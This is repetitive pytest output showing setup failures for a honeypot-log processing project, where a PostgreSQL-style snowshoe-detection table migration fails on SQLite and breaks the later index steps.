INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_____ ERROR at setup of TestLongtailStorage.test_session_linking_integrity _____

    @pytest.fixture
    def temp_db():
        """Create a temporary SQLite database for testing."""
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
            db_path = f.name
    
        engine = create_engine(f"sqlite:///{db_path}")
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_longtail_storage.py:37: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b26f99b0>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:40:10,607:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:40:10,608:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:40:10,616:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:40:10,618:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:40:10,619:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:40:10,622:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:40:10,623:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:40:10,624:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:40:10,625:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:40:10,626:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:40:10,628:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:40:10,629:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:40:10,630:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:40:10,631:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:40:10,632:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:10,632:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:10,633:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:10,633:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:10,634:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:10,634:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
__________ ERROR at setup of TestLongtailStorage.test_error_handling ___________

    @pytest.fixture
    def temp_db():
        """Create a temporary SQLite database for testing."""
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
            db_path = f.name
    
        engine = create_engine(f"sqlite:///{db_path}")
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_longtail_storage.py:37: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b26e2270>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:40:13,727:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:40:13,728:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:40:13,735:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:40:13,736:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:40:13,738:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:40:13,741:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:40:13,742:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:40:13,744:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:40:13,744:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:40:13,746:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:40:13,747:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:40:13,748:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:40:13,750:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:40:13,751:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:40:13,752:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:13,753:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:13,753:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:13,754:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:13,754:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:13,754:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_ ERROR at setup of TestLongtailIntegration.test_run_longtail_analysis_with_storage _

    @pytest.fixture
    def temp_db():
        """Create a temporary SQLite database for testing."""
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
            db_path = f.name
    
        engine = create_engine(f"sqlite:///{db_path}")
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_longtail_storage.py:37: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b26b3bd0>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:40:16,833:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:40:16,835:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:40:16,842:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:40:16,844:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:40:16,845:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:40:16,847:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:40:16,848:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:40:16,850:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:40:16,851:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:40:16,852:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:40:16,853:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:40:16,854:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:40:16,855:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:40:16,856:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:40:16,857:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:16,857:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:16,858:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:16,858:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:16,859:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:16,859:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
